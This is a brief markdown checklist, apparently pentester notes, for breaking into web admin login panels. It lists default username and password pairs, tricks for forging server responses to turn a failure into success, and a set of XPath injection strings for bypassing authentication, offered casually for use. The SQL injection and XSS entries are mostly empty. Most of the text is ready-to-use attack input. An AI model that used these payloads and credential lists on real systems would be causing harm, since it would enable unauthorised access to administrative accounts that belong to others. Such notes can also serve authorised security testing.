# Admin Panel

Try out these dudeeeee :)

- [ ]  Default Credentials
- [ ]  Bypass by SQL injection
- [ ]  XSS (Blind)
- [ ]  Response Manipulation
- [ ]  Directory Fuzzing
- [ ]  Check JS files
- [ ]  Check Comment (Source Code Clt + U)
- [ ]  X path, No Sql injections

## How to do:

- Default Credentials
    
    ```
    admin:admin
    admin:password
    author:author
    administrator:password
    admin123:password
    username:pass12345
    ```
    
    and use sites ..
    
- Bypass by SQL injection
    - 
- XSS
    - inject username or password with xss payloads
    - parameter discovery
- Response Manipulation
    
    ```
    change the status of response from 
    200 => 302
    failed => success
    error => success
    403 => 200
    403 => 302
    false => true
    ```
    
- Check JS file
    - look for credentials or path, parameter, …
- X path
    
    ```
    ' or '1'='1
    ' or ''='
    ' or 1]%00
    ' or /* or '
    ' or "a" or '
    ' or 1 or '
    ' or true() or '
    'or string-length(name(.))<10 or'
    'or contains(name,'adm') or'
    'or contains(.,'adm') or'
    'or position()=2 or'
    admin' or '
    admin' or '1'='2
    ```